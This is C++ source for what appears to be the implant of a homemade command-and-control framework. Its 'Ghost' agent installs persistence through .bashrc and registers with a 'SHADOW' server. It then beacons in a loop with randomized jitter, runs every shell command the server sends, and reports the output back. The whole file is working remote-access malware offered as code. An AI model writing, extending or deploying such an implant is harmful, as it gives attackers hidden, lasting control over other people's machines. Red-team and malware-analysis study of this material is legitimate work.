#include <string>
#include <vector>
#include <thread>
#include <chrono>

#include "apiSchema.hpp"
#include "config.hpp"
#include "httpClient.hpp"
#include "utils.hpp"

#include "modules/persistence.hpp"

class Ghost {
private:
    std::string uuid;
    std::string hostname;

    HttpClient client;
    int currentSleepInterval;
    int currentJitterPercent;

    std::vector<TaskResultDto> pendingResults;

public:
    // a potential problem with UUID arises if the implant gets reinstalled
    // it'll cause it to generate a new uuid
    // SHADOW won't know it's the same one
    // TODO: how to combat this?
    Ghost(std::string ip, int port)
        : uuid(Utils::generateUuid()),
        hostname(Utils::getHostname()),
        client(ip, port),
        currentSleepInterval(DEFAULT_SLEEP_SEC),
        currentJitterPercent(JITTER_PERCENT) {}

    bool registerGhost() {
        LOG_INFO("Trying to register with SHADOW")

        GhostDto registrationPayload;
        registrationPayload.id = uuid;
        registrationPayload.hostname = hostname;
        registrationPayload.os = OS_PLATFORM;

        std::string response = client.sendHttpRequest("POST", "/api/v1/ghost/register", registrationPayload.toJson());

        // TODO: ideally get back some sort of a config, but for now just get any data
        // TODO: make this check the reponse code instead
        if (!response.empty()) {
            LOG_SUCCESS("REGISTRATION SUCCESSFUL")
            return true;
        }

        return false; 
    }

    void persist() {
        // TOOD: chose from different persistence methods/try them one-by-one
        // TODO: parametrize for builder
        if (Persistence::bashrc() == 0) {
            LOG_SUCCESS("Persistence established")

            return;
        }

        LOG_ERROR("Persistence failed")
    }

    void beacon() {
        LOG_INFO("Starting beacon")

        while (true) {
            LOG_INFO("[BEACON] Heartbeat sent")
            
            HeartbeatRequestDto heartbeat;
            heartbeat.id = uuid;
            heartbeat.results = pendingResults;

            std::string rawResponse = client.sendHttpRequest("POST", "/api/v1/ghost/heartbeat", heartbeat.toJson());
            
            if (!rawResponse.empty()) {
                pendingResults.clear();

                HeartbeatResponseDto instructions = HeartbeatResponseDto::fromJson(rawResponse);
                std::cout << "WOW " << instructions.sleepInterval << " " << instructions.jitterPercent << " " << instructions.tasks.size() << "\n";

                if (instructions.sleepInterval > 0) {
                    currentSleepInterval = instructions.sleepInterval;
                }
                if (instructions.jitterPercent > 0) {
                    currentJitterPercent = instructions.jitterPercent;
                }

                if (!instructions.tasks.empty()) {
                    LOG_INFO("Received {} tasks", instructions.tasks.size())

                    for (const auto& task : instructions.tasks) {
                        processTask(task);
                    }
                }
            } else {
                LOG_ERROR("Response was empty")
            }

            sleepWithJitter();
        }
    }

private:
    void processTask(const TaskDefinitionDto& task) {
        LOG_INFO("Executing task {}: {}", task.id, task.command)

        TaskResultDto result;
        result.taskId = task.id;

        result.output = Utils::executeCommand(task.command + " " + task.args);
        result.status = "completed";
        
        pendingResults.push_back(result);
    }

    void sleepWithJitter() {
        int jitterSec = (currentSleepInterval * currentJitterPercent) / 100;
        int variance = (rand() % (jitterSec * 2 + 1)) - jitterSec;
        int finalSleep = currentSleepInterval + variance;

        if (finalSleep < 0) {
            finalSleep = 0;
        }

        std::this_thread::sleep_for(std::chrono::seconds(finalSleep));
    }
};

int main() {
    srand(time(0));

    LOG_SUCCESS("GHOST up on {}", OS_PLATFORM)

    Ghost ghost(SHADOW_IP, SHADOW_PORT);

    ghost.persist();

    // try to register with SHADOW
    while (!ghost.registerGhost()) {
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }

    // for now just beacon
    ghost.beacon();

    return 0;
}
